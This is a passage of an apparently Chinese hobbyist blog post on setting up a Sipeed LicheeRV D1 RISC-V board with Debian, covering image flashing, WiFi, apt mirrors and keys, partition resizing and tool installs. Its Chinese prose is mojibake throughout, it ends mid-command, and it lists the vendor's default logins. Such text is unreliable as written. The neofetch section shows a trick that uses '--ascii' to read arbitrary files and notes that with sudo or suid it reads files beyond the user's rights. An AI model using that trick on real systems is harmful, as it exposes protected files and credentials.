¸å¿ƒï¼Œæ”¯æŒRVVï¼Œ1GHz+ä¸»é¢‘ï¼Œå¯æ”¯æŒLinuxã€RTOSç­‰ç³»ç»Ÿã€‚åŒæ—¶æ”¯æŒæœ€é«˜4Kçš„H.265/H.264è§£ç ï¼Œå†…ç½®ä¸€é¢—HiFi4 DSPï¼Œæœ€é«˜å¯å¤–æ¥2GB DDR3ï¼Œå¯ä»¥åº”ç”¨äºæ™ºæ…§åŸå¸‚ã€æ™ºèƒ½æ±½è½¦ã€æ™ºèƒ½å•†æ˜¾ã€æ™ºèƒ½å®¶ç”µã€æ™ºèƒ½åŠå…¬å’Œç§‘ç ”æ•™è‚²ç­‰å¤šä¸ªé¢†åŸŸã€‚ Via D1-H èŠ¯ç‰‡ä»‹ç» æ¥ä¸‹æ¥å°±æ˜¯å¯¹æ¿å­çš„æŠ˜è…¾æ•…äº‹å•¦ã€‚ 0x02 çƒ§å½•ç³»ç»Ÿ &amp; ä¸Šç”µæµ‹è¯•çƒ§å½•å·¥å…·ï¼š PhoenixCard ç³»ç»Ÿé•œåƒï¼šåŒ…å«ä¸¤ç§ç³»ç»Ÿï¼ŒTina ä¸ºå®˜æ–¹é­”æ”¹çš„ OpenWRT ç³»ç»Ÿï¼Œéå¸¸è½»é‡ï¼›è€Œ Debian ä¸ºæ¡Œé¢çº§é•œåƒã€‚ Tinaæ˜¯åŸºäºOpenWRTé­”æ”¹çš„å°å‹Linuxç³»ç»Ÿï¼Œä¸å«å·¥å…·é“¾ï¼Œå»ºè®®ç”¨æˆ·è¿è¡Œç±»ä¼¼WAFTè¿™æ ·çš„wasmå­—èŠ‚ç ç¨‹åºæˆ–è€…å…¶ä»–è„šæœ¬ç±»ç¨‹åºï¼Œæˆ–è€…ä½¿ç”¨äº¤å‰ç¼–è¯‘å·¥å…·é“¾è¿›è¡ŒäºŒè¿›åˆ¶å¯æ‰§è¡Œç¨‹åºçš„å¼€å‘ã€‚ Debiané•œåƒæ˜¯æ¡Œé¢çº§é•œåƒï¼Œå«åŒ…ç®¡ç†å™¨å’Œå·¥å…·é“¾ç­‰ï¼Œç”¨æˆ·å¯ä»¥åƒåœ¨PCä¸Šä¸€æ ·å¼€å‘ï¼Œé€‚åˆæ™®é€šè½¯ä»¶å·¥ç¨‹å¸ˆä½¿ç”¨ï¼Œç¼ºç‚¹æ˜¯ä½“ç§¯å¤§ï¼Œé€Ÿåº¦æ…¢ã€‚ å›½å†…ç”¨æˆ·ï¼šTina ç³»ç»Ÿé•œåƒ æˆ–è€… Debian ç³»ç»Ÿé•œåƒ (ç™¾åº¦ç½‘ç›˜ æå–ç ï¼šwbef) å›½å¤–ç”¨æˆ·ï¼šMega Tina ç³»ç»Ÿç™»å½•ç”¨æˆ·åï¼šroot å¯†ç ï¼ština Debian ç³»ç»Ÿç™»å½•ç”¨æˆ·åï¼šsipeed å¯†ç ï¼šlicheepi è¿™é‡Œå€Ÿç”¨ä¸ªå®˜æ–¹çš„å›¾ï¼Œè®°å¾—é€‰çš„æ˜¯ å¯åŠ¨å¡ã€‚ Tina ç³»ç»Ÿé•œåƒåªæœ‰ 110å¤š MiBï¼Œåˆ·èµ·æ¥å¾ˆå¿«ï¼Œå¤§æ¦‚åŠåˆ†é’Ÿå·¦å³ï¼›è€Œ Debian ç³»ç»Ÿé•œåƒç”±äºå·®ä¸å¤š 3.7+GiBï¼Œè²Œä¼¼éœ€è¦10å¤šåˆ†é’Ÿï¼Œå¯èƒ½å¾ˆé•¿ä¸€æ®µæ—¶é—´ç•Œé¢ä¸Šæ²¡åŠ¨é™ï¼Œç­‰ç€å°±å¥½äº†ã€‚ è¿ä¸Š HDMIï¼Œæ€¼ä¸Š USB é”®é¼ ï¼Œæ’ç”µå¼€æœºã€‚ å™¢ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œç›´æ¥ç”¨ USB C to C çš„çº¿æ˜¯ä¸èƒ½ç»™ä»–æä¾›ä¾›ç”µçš„ï¼Œå®˜æ–¹çš„è¯´æ˜æ˜¯ å½“å‰æ ¸å¿ƒæ¿çš„USB Type-Cè¿æ¥å™¨ä½¿ç”¨CCå¼•è„šä½œä¸ºè‡ªåŠ¨OTGçš„è¯†åˆ«å¼•è„šï¼Œä½†æ˜¯ä¸USB C to C æ•°æ®çº¿çš„è¯†åˆ«å­˜åœ¨å†²çªï¼Œåªèƒ½ä½¿ç”¨A to Cæ•°æ®çº¿ï¼Œå¯åœ¨ç¡¬ä»¶ä¸Šæ”¹åŠ¨å™¨ä»¶è¿›è¡Œåˆ‡æ¢ï¼Œå…±æœ‰ä¸¤ç§å·¥ä½œæ–¹å¼â€¦ å¦‚éœ€ä½¿ç”¨C to Cæ•°æ®çº¿ï¼Œåˆ™éœ€è¦æ”¹åŠ¨TypeCæ¥å£å‘¨å›´çš„å™¨ä»¶å¯¹åº”CCè¯†åˆ«æ¨¡å¼ï¼Œå¹¶åœ¨éœ€è¦æ‰©å±•å¤–ç½®USBè®¾å¤‡æ—¶æ‰‹åŠ¨åˆ‡æ¢ä¸ºHOSTæ¨¡å¼ã€‚ äºæ˜¯ä¹ˆå¾—åŠæ³•ï¼Œæ‰¾äº†æ¡ USB A to C çš„çº¿æ‰èƒ½ä¸Šç”µã€‚ å–µå–µå…ˆè¯•äº†è¯• Tina ç³»ç»Ÿï¼Œé¡ºä¾¿ä¸ºäº†çœ‹çœ‹ä¸²å£çš„æ¶ˆæ¯ï¼Œå¾—æ‰¾ä¸ªå·¥å…·ï¼Œç„¶è€Œæ‰‹ä¸Šæ²¡æœ‰ç‹¬ç«‹çš„ CH340 / CP2102 ä¹‹ç±»çš„ USB è½¬ UART ä¸²å£è°ƒè¯•å™¨ã€‚ ï¼ˆå—¯ï¼Œæ‰‹è¾¹ä¸€ä¸ª FPGA æ¿å­ä¸Šè‡ªå¸¦äº†ä¸ª CP2102ï¼Œä½†çœ‹äº†ä¸‹æ‰‹å†Œå‘ç°èŠ¯ç‰‡ä½¿ç”¨çš„ 3.3V ç”µå¹³ä¸ FPGA çš„ 1.8V ç”µå¹³ä¸­é—´åŠ äº†ä¸ªç”µå¹³è½¬æ¢èŠ¯ç‰‡ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœç›´æ¥å¤ç”¨ FPGA å¼•å‡ºçš„ç®¡è„šï¼Œæœ‰çƒ§å FPGA çš„é£é™©ï¼Œè¿™æ˜¾ç„¶å¤ªå±é™©ï¼Œåäº†å°±å¤ªäºäº† è€ƒè™‘åˆ°æ‰‹è¾¹åªæœ‰ä¸ªå¼€æºçš„é€»è¾‘åˆ†æä»ª nanoDLAï¼Œè™½ç„¶åªèƒ½æ”¶ä¿¡å·ä¸èƒ½å‘ä¿¡å·ï¼Œä½†æ¯•ç«Ÿä¿¡å·éƒ½æ˜¯01è·³å˜çš„ç”µå¹³ï¼Œå†åŠ ä¸Šæœ¬èº«ä¸Šä½æœºä¹Ÿå¸¦æœ‰ UART åè®®è§£æï¼Œäºæ˜¯çªç„¶ä¸€æƒ³ä¸å¦‚ç›´æ¥æŠŠçº¿æ€¼åˆ°æ¿å­çš„ UART ç®¡è„šä¸ŠæŠŠæ•°æ®æŠ“ä¸‹æ¥ã€‚ å—¯ï¼Œè¿˜ä¸é”™ï¼Œåˆä¸æ˜¯ä¸èƒ½ç”¨.jpg å¥½è€¶ï¼Œè·‘èµ·æ¥äº†ï¼ æ¥ä¸‹æ¥è¯•è¯• Debianï¼Œæ¯•ç«Ÿå’±è¿˜æ˜¯ç”¨æ¥è·‘ä¸œè¥¿ç©çš„ï¼Œé¡ºä¾¿ç”¨æ¥å¼€å‘ï¼ˆï¼Ÿï¼‰ï¼Œåæ–‡å°±éƒ½æ˜¯ Debian äº†ã€‚ çƒ§å½•çš„æ˜¯ LicheeRV_Debian_dock_hdmi_8723ds.img è¿™ä¸ªé•œåƒï¼Œæ”¯æŒ LicheeRV Dock åº•æ¿ï¼Œæ”¯æŒ HDMI æ¥å£ï¼Œ8723ds æ˜¯ WiFi èŠ¯ç‰‡çš„å‹å·ã€‚ çƒ§å¥½åç­‰äº†å¥½ä¸€ä¼šå„¿ï¼Œç»ˆäºå±å¹•ä¸Šæœ‰æ˜¾ç¤ºäº†ï¼ ç”¨ä¸Šé¢çš„é»˜è®¤å¯†ç ç™»å½•è¿›å»ï¼Œéšä¾¿çœ‹çœ‹ å¥½è€¶ï¼æ„Ÿè§‰è¿˜è¡Œï¼Ÿ é¡ºä¾¿æ¥å¼ æ¿å¡çš„å®æ™¯å›¾ï¼Œå¿½ç•¥ä¹±ä¸ƒå…«ç³Ÿçš„æ¡Œé¢ï¼ˆ 0x03 é…ç½® WiFiå›¾å½¢åŒ–ç•Œé¢ä¸­ï¼Œä¾æ¬¡ç‚¹å‡»å·¦ä¸‹è§’å¼€å§‹èœå• / Preferences / Connman Settingsï¼Œå³å¯æ‰“å¼€ WIFI è¿æ¥é¡µé¢ BTWï¼Œç»ˆç«¯ä½äº System Tools / Termit åœ¨ç•Œé¢ä¸Šé…ç½® WiFi å³å¯ï¼Œè¿æ¥åä¼šå ç”¨ wlan0 ç½‘å£ã€‚ ç°åœ¨é€šè¿‡å±å¹•æˆ–è€…é€šè¿‡ä½ çš„è·¯ç”±å™¨çœ‹ä¸€çœ‹ IP åœ°å€ï¼Œå°±èƒ½ä» ssh ä¸Šå»å•¦ï¼ åˆšå¼€å§‹å–µå–µæ”¹çš„æ˜¯ /etc/wifi/wpa_supplicant.confé‡Œçš„ ssid å’Œ å¯†ç ï¼Œä½†æ˜¯å‘ç°é‡å¯ä¹‹åä¹Ÿè¿ä¸ä¸Š WiFiï¼ŒçŒœæƒ³æ˜¯æ²¡å¼€å¯ WiFi çš„ç¼˜æ•…ã€‚ ä½†æ˜¯åœ¨å·²ç»é…ç½®ä¸Šè¿°æ–‡ä»¶çš„æƒ…å†µä¸‹å†åœ¨å›¾å½¢åŒ–ç•Œé¢è¿æ¥ WiFiï¼Œä¸çŸ¥é“ä¸ºå•¥è¿ä¸Šä¹‹åæ•´ä¸ªç•Œé¢å°±å¡æ­»äº†ï¼Œé”®ç›˜é¼ æ ‡å•¥ååº”éƒ½æ²¡æœ‰â€¦â€¦ å¯æ˜¯é‡å¯ååˆè¿ä¸Š WiFi äº†è€Œä¸”å›¾å½¢åŒ–ç•Œé¢å¹¶æ²¡æœ‰å¡æ­»åè€Œèƒ½ç”¨äº†ï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰ï¼Œè€Œå ç”¨çš„æ˜¯ wlan1 æ¥å£ã€‚ å¦å¤–ï¼Œä¹‹åé‡æ–°åˆ·äº†é•œåƒï¼Œç›´æ¥åœ¨å›¾å½¢åŒ–ç•Œé¢ä¸Šé…ï¼ˆè€Œæ²¡æœ‰é…è¿™ä¸ªæ–‡ä»¶ï¼‰ï¼Œå°±ä¸ä¼šå‡ºç°å¡æ­»çš„æƒ…å†µï¼Œæœ‰ç‚¹è¿·ï¼Œæ‘¸äº†ã€‚ å™¢ï¼Œåé¢åœ¨ç½‘ä¸Šä¹ŸæŸ¥åˆ°äº†ç±»ä¼¼çš„é—®é¢˜ï¼šSipeed Lichee RV Dock, with Debian: system locks up when wifi on â€œAssociationâ€ in Connman ä»–å‘ç°è¿æ¥ä¸€ä¸ªæ— å¯†ç çš„ WiFi å°±èƒ½ç”¨äº†ï¼Œè‰ã€‚ å¦å¤–ï¼Œè¿™é‡Œä¹Ÿæç¤ºäº† connman çš„é…ç½®æ–‡ä»¶å­˜æ”¾åœ¨ /var/lib/connman/ ä¸‹ã€‚ ï¼ˆæ„æ€æ˜¯ä»–æ²¡æœ‰è°ƒç”¨ /etc/wpa_supplicant æˆ–è€… /run/wpa_supplicantï¼Ÿ æ¯”å¦‚å’±åœ¨å›¾å½¢åŒ–ç•Œé¢ä¸Šé…ç½®å¥½äº†çš„è¯ï¼Œé‡Œé¢çš„æ–‡ä»¶ç»“æ„æ˜¯è¿™æ ·å­çš„ã€‚ï¼ˆæŒ‰ç†è¯´ç›´æ¥é…æ–‡ä»¶ä¹Ÿè¡Œå§ è¿˜æœ‰ä¸€ç§æ–¹æ³•æ˜¯ç”¨ wpa_cli å·¥å…·ï¼Œä¸è¿‡å’±æ²¡è¯•è¿‡ï¼Œè¿™é‡Œå°±ä¸¢ä¸€ä»½å¤‡ç”¨å§ã€‚ wpa_cli -iwlan0 scan wpa_cli -iwlan0 scan_result wpa_cli -iwlan0 add_network wpa_cli -iwlan0 set_network 1 ssid '\"YourSsid\"' wpa_cli -iwlan0 set_network 1 psk '\"YourPassword\"' wpa_cli -iwlan0 enable_network 1 wpa_cli -iwlan0 save_config wpa_cli -iwlan0 status ç½‘ä¸Šçš„è¯´æ³•æ˜¯éœ€è¦æ³¨æ„ï¼šwifiåä»¥åŠwifiå¯†ç çš„å­—ç¬¦ä¸²éœ€è¦ç”¨ä¸€ä¸ªå•å¼•å·åŠ ä¸€ä¸ªåŒå¼•å·åŒ…ä½ 0x04 æ›´æ¢è½¯ä»¶æº / æ¢æºé»˜è®¤çš„æ˜¯å®˜æ–¹çš„ ftpï¼Œè¿™é‡Œå¯ä»¥æ¢æˆå›½å†…çš„é•œåƒç«™ã€‚ ç”¨ä½ å–œæ¬¢çš„ç¼–è¾‘å™¨æ‰“å¼€ï¼Œæ¯”å¦‚ nano sudo nano /etc/apt/sources.list æ¯”å¦‚æ¢æˆé˜¿é‡Œçš„ï¼š deb https://mirrors.aliyun.com/debian-ports/ sid main deb https://mirrors.aliyun.com/debian-ports/ unreleased main # deb http://ftp.ports.debian.org/debian-ports/ sid main # deb http://ftp.ports.debian.org/debian-ports/ unreleased main # deb-src http://ftp.ports.debian.org/debian-ports/ sid main æˆ–è€… ä¸Šäº¤ SJTU çš„ï¼š deb [arch=riscv64] http://mirror.sjtu.edu.cn/debian-ports unstable main deb [arch=riscv64] http://mirror.sjtu.edu.cn/debian-ports unreleased main ï¼ˆç„¶è€Œä¸Šäº¤çš„æºå’±ç”¨çš„æ—¶å€™ expire äº†ï¼Œä¼°è®¡æ˜¯å¤ªä¹…æ²¡åŒæ­¥çš„åŸå›  å§ è€Œåéœ€è¦æ‰‹åŠ¨ æ·»åŠ  public keyï¼Œä¸ç„¶ä¼šæç¤ºç”±äºå…¬é’¥ä¸å¯ç”¨å¯¼è‡´ç­¾åæ— æ³•éªŒè¯ï¼Œä»è€Œæ— æ³•æ›´æ–°ã€‚ The following signatures couldn't be verified because the public key is not available: NO_PUBKEY E852514F5DF312F6 ç¬¬ä¸€ç§æ–¹æ³•ï¼š å¯ä»¥ç›´æ¥æŠŠä¸‹è½½å¥½çš„ archive_2022.key é€šè¿‡ SD å¡æˆ–è€… scp æˆ–è€…å…¶ä»–ä½ å–œæ¬¢çš„æ–¹å¼ä¼ åˆ°æ¿å­ä¸Šï¼Œç„¶å addã€‚ ä¸‹è½½åœ°å€ï¼š å’±è¿™é‡Œï¼Œæˆ–è€… ç™¾åº¦ç½‘ç›˜ sudo apt-key add archive_2022.key sudo apt update æˆ–è€…ï¼Œç¬¬äºŒç§æ–¹æ³•ï¼š ä¸‹è½½ deb åŒ…æ¥æ›´æ–°ä¸‹å¯†é’¥ ç½‘é¡µä¸‹è½½ï¼šhttps://packages.debian.org/sid/all/debian-ports-archive-keyring/download wgetæ–¹å¼ wget http://ftp.cn.debian.org/debian/pool/main/d/debian-ports-archive-keyring/debian-ports-archive-keyring_2022.02.15_all.deb ä¹‹åæ‰§è¡Œ sudo dpkg -i debian-ports-archive-keyring_2022.02.15_all.deb sudo apt update å†æˆ–è€…ï¼Œç¬¬ä¸‰ç§æ–¹æ³•ï¼š ä» gpg keyserver æ¥æ”¶å…¬é’¥ sudo apt-key adv --keyserver keys.gnupg.net --recv-keys &lt;PUBKEY&gt; # or # sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys &lt;PUBKEY&gt; # æˆ–è€…å…ˆæ¥æ”¶å†å¯¼å…¥åˆ° apt-key # gpg --keyserver keys.gnupg.net --recv-key &lt;PUBKEY&gt; # gpg -a --export &lt;PUBKEY&gt; | sudo apt-key add - sudo apt update åˆ«å¿˜äº† updateã€‚ 0x05 ä¿®æ”¹æ—¶åŒºå’±è¿™é‡Œç”¨çš„ Asia/Shanghai (CST, +0800) TZ=Asia/Shanghai sudo ln -sf /usr/share/zoneinfo/${TZ} /etc/localtime æˆ–è€…ä¹Ÿå¯ä»¥ç”¨ timedatectl timedatectl set-timezone Asia/Shanghai timedatectl å† date çœ‹ä¸‹æ—¶é—´å°±å‘ç°å˜æˆ CST æ—¶åŒºäº†ã€‚ 0x06 æ‰©å®¹ SD å¡ä¸­çš„ rootfså®‰è£…äº†ä¸€äº›ä¸œè¥¿ä¹‹åï¼Œå‘ç°è£…ä¸ä¸‹å•¦ï¼ çœ‹äº†çœ‹å‘ç° æ ¹ç›®å½• / ä¸‹åªå‰©ä¸‹ 200å¤š MiB å¯ç”¨ç©ºé—´äº†ï¼Œè¿™ä¸å¯¹å•Šï¼Œè¿™å¯æ˜¯å¼  64GB çš„ SD å¡å•Šï¼ çœ‹ä¸€ä¸‹åˆ†åŒºå°±èƒ½å‘ç°ï¼Œæ ¹ç›®å½•æŒ‚è½½åˆ°äº† SD å¡çš„ç¬¬7ä¸ªåˆ†åŒºï¼Œè€Œæœ€åçš„ç¬¬8åˆ†åŒºåˆ™æ²¡æœ‰åˆ©ç”¨ä¸Šã€‚ æŠŠ SD å¡æ’åˆ°è¯»å¡å™¨ä¸Šï¼Œç›´é€šè¿› Ubuntu è™šæ‹Ÿæœºé‡Œä¹Ÿå¯ä»¥çœ‹åˆ°ã€‚ è¿™é‡Œå‚è€ƒçš„æ˜¯ LicheeRV dockã®rootãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’æ‹¡å¼µã—ãŸã‚Šã„ã‚ã„ã‚ è¿™ç¯‡ã€‚ ç›´æ¥åœ¨æ¿å­ä¸Šè¿›è¡Œæ“ä½œ ï¼ˆå¦‚æœæ‚¨æ•°æ®å®è´µï¼Œå»ºè®®å…ˆå¯¹ SD å¡å†…å®¹è¿›è¡Œå¤‡ä»½ï¼‰ åˆ é™¤æœ€åçš„ç¬¬8ä¸ªåˆ†åŒºï¼Œå°†ç¬¬7ä¸ªåˆ†åŒºæ‰©å±•åˆ° 100%ï¼Œè€Œåé€€å‡ºï¼Œæœ€åæ‰©å±•æ–‡ä»¶ç³»ç»Ÿã€‚ sipeed@sipeed:~$ sudo parted GNU Parted 3.4 Using /dev/mmcblk0 Welcome to GNU Parted! Type 'help' to view a list of commands. (parted) p Model: SD EC2QT (sd/mmc) Disk /dev/mmcblk0: 64.0GB Sector size (logical/physical): 512B/512B Partition Table: gpt Disk Flags: Number Start End Size File system Name Flags 1 21.2MB 25.4MB 4129kB boot-resource msftdata 2 25.4MB 25.6MB 258kB env msftdata 3 25.6MB 25.9MB 258kB env-redund msftdata 4 25.9MB 37.2MB 11.3MB boot msftdata 5 37.2MB 37.7MB 516kB dsp0 msftdata 6 37.7MB 52.2MB 14.5MB recovery msftdata 7 52.2MB 8642MB 8590MB ext4 rootfs msftdata 8 8642MB 64.0GB 55.4GB UDISK msftdata (parted) rm 8 (parted) p Model: SD EC2QT (sd/mmc) Disk /dev/mmcblk0: 64.0GB Sector size (logical/physical): 512B/512B Partition Table: gpt Disk Flags: Number Start End Size File system Name Flags 1 21.2MB 25.4MB 4129kB boot-resource msftdata 2 25.4MB 25.6MB 258kB env msftdata 3 25.6MB 25.9MB 258kB env-redund msftdata 4 25.9MB 37.2MB 11.3MB boot msftdata 5 37.2MB 37.7MB 516kB dsp0 msftdata 6 37.7MB 52.2MB 14.5MB recovery msftdata 7 52.2MB 8642MB 8590MB ext4 rootfs msftdata (parted) resizepart 7 100% (parted) p Model: SD EC2QT (sd/mmc) Disk /dev/mmcblk0: 64.0GB Sector size (logical/physical): 512B/512B Partition Table: gpt Disk Flags: Number Start End Size File system Name Flags 1 21.2MB 25.4MB 4129kB boot-resource msftdata 2 25.4MB 25.6MB 258kB env msftdata 3 25.6MB 25.9MB 258kB env-redund msftdata 4 25.9MB 37.2MB 11.3MB boot msftdata 5 37.2MB 37.7MB 516kB dsp0 msftdata 6 37.7MB 52.2MB 14.5MB recovery msftdata 7 52.2MB 64.0GB 64.0GB ext4 rootfs msftdata (parted) q Information: You may need to update /etc/fstab. sipeed@sipeed:~$ df -h Filesystem Size Used Avail Use% Mounted on /dev/root 3.6G 3.2G 224M 94% / devtmpfs 242M 0 242M 0% /dev tmpfs 246M 0 246M 0% /dev/shm tmpfs 99M 892K 98M 1% /run tmpfs 5.0M 4.0K 5.0M 1% /run/lock tmpfs 50M 24K 50M 1% /run/user/110 tmpfs 50M 20K 50M 1% /run/user/1000 sipeed@sipeed:~$ ls -al /etc/fstab -rw-r--r-- 1 root root 92 Jun 1 2021 /etc/fstab sipeed@sipeed:~$ cat /etc/fstab # UNCONFIGURED FSTAB FOR BASE SYSTEM /dev/mmcblk0p7 / ext4 rw,defaults,relatime,discard 0 1 sipeed@sipeed:~$ sudo resize2fs /dev/mmcblk0p7 resize2fs 1.46.2 (28-Feb-2021) Filesystem at /dev/mmcblk0p7 is mounted on /; on-line resizing required old_desc_blocks = 1, new_desc_blocks = 4 The filesystem on /dev/mmcblk0p7 is now 15617597 (4k) blocks long. sipeed@sipeed:~$ df -ah Filesystem Size Used Avail Use% Mounted on /dev/root 59G 3.2G 53G 6% / devtmpfs 242M 0 242M 0% /dev proc 0 0 0 - /proc sysfs 0 0 0 - /sys tmpfs 246M 0 246M 0% /dev/shm devpts 0 0 0 - /dev/pts tmpfs 99M 892K 98M 1% /run tmpfs 5.0M 4.0K 5.0M 1% /run/lock cgroup2 0 0 0 - /sys/fs/cgroup debugfs 0 0 0 - /sys/kernel/debug fusectl 0 0 0 - /sys/fs/fuse/connections configfs 0 0 0 - /sys/kernel/config tmpfs 50M 24K 50M 1% /run/user/110 tmpfs 50M 20K 50M 1% /run/user/1000 æ‰©å®¹å®Œæˆå•¦ï¼ è¯´ä¸€ä¸‹å°è¯•è¿‡çš„æ–¹æ³•ï¼Œè¯·æ³¨æ„è¿™é‡Œçš„æ–¹æ³•ä¸å¯è¡Œï¼ä¸å¯è¡Œï¼ä¸å¯è¡Œï¼ ä¹‹å‰åœ¨ Windows ä¸‹æƒ³ç”¨ DiskGenius æ¥æ‰©å®¹ã€‚ ä¹Ÿæ˜¯åˆ é™¤æœ€åä¸€ä¸ªåˆ†åŒºï¼Œç„¶åæŠŠå€’æ•°ç¬¬äºŒä¸ªæ‰©å®¹åˆ°æœ€åï¼Œç»“æœæŠ¥é”™å•¦ï¼ è¯´æ˜¯åœ¨ inode é‡Œæœ‰è°ƒç”¨æˆ–è€…äº¤å‰ link å•¥çš„ï¼Ÿï¼Ÿï¼Ÿéº»äº†å‘€ï¼ ç„¶è€Œå’±ä¹ˆå¾—åŠæ³•ï¼Œæƒ³æƒ³è¦ä¸å…ˆæŠŠè¿™ä¸ª rootfs åˆ†åŒºå¤‡ä»½ä¸€éï¼Œé‡æ–°åˆ·åŸç‰ˆç³»ç»Ÿå†æ¢å¤å›å»ï¼Ÿ äºæ˜¯å°±è¿™ä¹ˆå¹²äº†ï¼Œåˆ·å¥½ä¹‹åç”¨å¤‡ä»½å¥½çš„ rootfs åˆ†åŒºè¦†ç›–æ‰ï¼Œç»“æœå‘ç°æ€ä¹ˆç³»ç»Ÿèµ·ä¸æ¥äº†â€¦â€¦éº»äº†ï¼ï¼ï¼ï¼ ä¼°è®¡æ˜¯å…¶ä»–çš„ boot ç­‰åˆ†åŒºé”…äº†çš„åŸå› ï¼Œå°è¯•ç€æŠŠå¤‡ä»½å¥½çš„åœ¨ DiskGenius é‡Œè¿˜åŸï¼Œå¯æ˜¯ï¼Œä»–ä¸æ”¯æŒè¿˜åŸè¿™æ–‡ä»¶ç³»ç»Ÿï¼Œè®©å’±é€‰ä¸€ä¸ªå…¶ä»–çš„åˆ†åŒºæ¥è¿˜åŸï¼ï¼ï¼ä¹Ÿå°±æ˜¯è¯´ä»–å¯¹è¿™ç§é Windows ç³»ç»Ÿåˆ†åŒºæ”¯æŒä¸å¤§è¡Œã€‚ å¯æ¶å•Šï¼ï¼ï¼ åœ¨ å¦ä¸€ç¯‡æ–‡ç«  ä¸­ä¹Ÿæåˆ°äº†è¿™ç‚¹ã€‚ æœ€åä¹ˆå¾—åŠæ³•åªèƒ½åˆé‡åˆ·äº†ä¸€éå®˜æ–¹é•œåƒâ€¦â€¦ å¦ä¸€ç§æ‰©å®¹æ–¹æ¡ˆï¼š å½“ç„¶ï¼Œå¦‚æœæŒ‚è½½åˆ° Linux çš„è™šæ‹Ÿæœºé‡Œï¼Œå†è¿›è¡Œæ‰©å®¹æ“ä½œåº”è¯¥æ˜¯å¯è¡Œçš„ï¼Œè¿™é‡Œå°±ç•¥äº†ï¼Œå¯ä»¥å‚è€ƒ ã€å¹³å¤´å“¥Sipeed LicheeRV 86 Panelæµ‹è¯„ã€‘7-Waftå›¾å½¢ç•Œé¢å¼€å‘æµ‹è¯•ï¼ˆä¸‹ï¼‰ è¿™ä¸ªå¸–å­é‡Œçš„åšæ³•ã€‚ 0x07 åœæ­¢ç³»ç»Ÿæ—¥å¿—é”™è¯¯æ˜¾ç¤ºåœ¨ ssh ç•Œé¢ï¼Œä¼šä¸åœåœ°æç¤º kernel é”™è¯¯çš„ä¿¡æ¯ã€‚ Message from syslogd@sipeed at Mar 20 07:05:09 ... kernel:[ 386.031121] Oops [#17] è™½ç„¶ä¸å½±å“æ­£å¸¸ä½¿ç”¨ï¼Œä½†è®©å–µå–µçœ‹å¾—éå¸¸éš¾å—ï¼Œæ¯”å¦‚åœ¨ nano ä¸‹ç¼–è¾‘ç€ä¸œè¥¿æˆ–è€… htop ä¸‹çœ‹ç€ç›‘æ§ï¼ˆå’‹ç›‘æ§å®¤è€å¤§çˆ·å•Šã€‚ã€‚ï¼‰ï¼ŒåŠ¨ä¸åŠ¨æ¥ä¸ªå†…æ ¸é”™è¯¯çš„æ¶ˆæ¯å¼¹å‡ºæ¥ï¼Œå•Šï¼Œå¿ä¸äº†ï¼ æŸ¥äº†ä¸‹ï¼Œä¹Ÿæœ‰äººé‡åˆ°äº†è¿™é—®é¢˜ï¼Œå®˜æ–¹åœ¨ twitter ä¸Šçš„å›å¤ è¯´æ˜¯ 8723 WiFi èŠ¯ç‰‡é©±åŠ¨çš„é—®é¢˜ï¼Œä½†æ˜¯ä»–èƒ½æ­£å¸¸å·¥ä½œï¼Œå¿½ç•¥å°±å®Œäº‹äº†ã€‚ å•Šè‰ï¼Œé‚£æ€»å‡ºç°ä¹Ÿå¤ªéš¾å—äº†å§â€¦â€¦ äºæ˜¯æœ‰ä¸ªåˆä¸æ˜¯ä¸è¡Œçš„æ–¹æ¡ˆï¼Œé‚£å°±æ˜¯ åªè®©é”™è¯¯ä¿¡æ¯è¾“å‡ºç»™ root ç”¨æˆ· å°±å¥½äº†ã€‚ ç”¨ä½ å–œæ¬¢çš„ç¼–è¾‘å™¨æ‰“å¼€ /etc/rsyslog.conf æ–‡ä»¶ï¼Œä¿®æ”¹æœ€åä¸€è¡Œï¼Œå°† * æ”¹æˆ rootã€‚ # *.emerg :omusrmsg:* *.emerg :omusrmsg:root é‡å¯ä¹‹åå† ssh ä¸Šå»å°±ä¸ä¼šå†å¼¹ message äº†ã€‚ BTWï¼Œä¸¢ä¸ªæ—¥å¿—æˆªå›¾åœ¨è¿™é‡Œã€‚ 0x08 ä¿®æ”¹å¯†ç passwd æŒ‰æç¤ºè¾“å…¥ä¸¤æ¬¡å¯†ç å°±å®Œäº‹äº†ã€‚ 0x09 å®‰è£… neofetchå’±è£…ç³»ç»Ÿéƒ½å–œæ¬¢æ•´ä¸ª neofetch çœ‹çœ‹ï¼Œå“ˆå“ˆï¼ˆ sudo apt install neofetch neofetch å¥½è€¶ï¼ BTW, è¿™ç©æ„å…¶å®å¯ä»¥é€šè¿‡æŒ‡å®šå›¾æ¡ˆå¯¹åº”çš„æ–‡ä»¶æ¥å®ç°è¯»å–ä»»æ„æ–‡ä»¶ï¼Œå¦‚æœé…ä¸Š suid æˆ–è€… sudo æƒé™çš„è¯è¿˜èƒ½è¶Šæƒè¯»äº†ï¼ˆ LFILE=file_to_read neofetch --ascii $LFILE # sudo neofetch --ascii $LFILE 0x0A å®‰è£… curl wget gité»˜è®¤è¿™ä¸ªé•œåƒé‡Œæ²¡æœ‰å•¥æ–¹ä¾¿çš„ç½‘ç»œè¯·æ±‚å·¥å…·ï¼Œäºæ˜¯é¡ºæ‰‹è£…ä¸€ä¸‹ã€‚ sudo apt install curl wget git é¡ºä¾¿æ„Ÿå¹ä¸€ä¸‹åœ¨è¿™ä¸Šé¢è£…ä¸œè¥¿ç¡®å®æŒºæ…¢çš„â€¦â€¦ å¥½è€¶ï¼Œåœ¨ RV æ¿å­ä¸Šè®¿é—®å’±åšå®¢ï¼ 0x0B å®‰è£… speedtestè¿˜æ˜¯å…ˆæ‹¿ speedtest-cli å‡‘åˆç”¨ä¸€ä¸‹å§â€¦â€¦ sudo apt install speedtest-cli speedtest å•Šï¼Œè¿™ WiFi è¿æ¥ç¡®å®ä¸å¤§ç¨³ã€‚ã€‚åˆä¸æ˜¯ä¸èƒ½ç”¨ å…¶å®å–µå–µä¸å¤§å–œæ¬¢ python ç¼–å†™çš„é‚£ä¸ª speedtest-cliï¼Œè¿˜æ˜¯ä¹ æƒ¯å®˜æ–¹çš„ SpeedtestÂ® CLIã€‚ ï¼ˆæœ€å¼€å§‹è¿™ä¹ˆå¼„çš„ï¼Œç»“æœå‘ç°ç¿»è½¦äº† ## If migrating from prior bintray install instructions please first... # sudo rm 